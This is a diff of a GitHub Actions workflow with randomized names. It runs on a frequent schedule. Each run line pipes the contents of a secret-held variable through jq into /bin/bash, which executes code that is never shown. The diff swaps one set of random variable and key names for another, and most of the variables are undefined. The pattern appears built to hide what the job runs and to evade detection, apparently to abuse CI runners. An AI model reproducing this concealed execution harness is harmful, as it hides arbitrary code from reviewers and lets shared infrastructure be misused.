@@ -1,9 +1,9 @@
 name: meiwucan8563
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 2/6 * * *'
+    - cron: '14 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,24 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: meiwucan8563
         env:
-          lg34: ${{ secrets.lg34 }}
+          uedb41: ${{ secrets.uedb41 }}
         run: |
-          echo $lg34 | jq -r .h52 | /bin/bash
-          echo $nse2 | jq -r .v9 | /bin/bash
-          echo $k8 | jq -r .rxj7 | /bin/bash
-          echo $n92 | jq -r .ked6 | /bin/bash
-          echo $zyt0626 | jq -r .jg5 | /bin/bash
-          echo $y35827 | jq -r .t06437 | /bin/bash
-          echo $ilie790 | jq -r .zwc1611 | /bin/bash
-          echo $ub750 | jq -r .er98654 | /bin/bash
-          echo $rpp00 | jq -r .h27 | /bin/bash
-          echo $hfo9 | jq -r .lf89 | /bin/bash
-          echo $kkftb7 | jq -r .juubb55237 | /bin/bash
-          echo $rf86044 | jq -r .gskz189 | /bin/bash
-          echo $liz358 | jq -r .ashus6 | /bin/bash
-          echo $vw232 | jq -r .g0377 | /bin/bash
-          echo $h624 | jq -r .h44369 | /bin/bash
-          echo $tvj6 | jq -r .htsrs35159 | /bin/bash
-          echo $kkf3 | jq -r .eecej812 | /bin/bash
-          echo $qt49221 | jq -r .ge3388 | /bin/bash
+          echo $uedb41 | jq -r .d4083 | /bin/bash
+          echo $qfq95300 | jq -r .y048 | /bin/bash
+          echo $fgux6366 | jq -r .lv3686 | /bin/bash
+          echo $vu97648 | jq -r .eakc82954 | /bin/bash
+          echo $l526 | jq -r .q611 | /bin/bash
+          echo $vxvw7 | jq -r .htr717 | /bin/bash
+          echo $nfjje769 | jq -r .olstu2373 | /bin/bash
+          echo $oc33217 | jq -r .qczg1 | /bin/bash
+          echo $p573 | jq -r .aexk764 | /bin/bash
+          echo $aobi1478 | jq -r .jb481 | /bin/bash
+          echo $sql2142 | jq -r .pia38 | /bin/bash
+          echo $kxco2167 | jq -r .uxpq5257 | /bin/bash
+          echo $vx7129 | jq -r .swpv6504 | /bin/bash
 
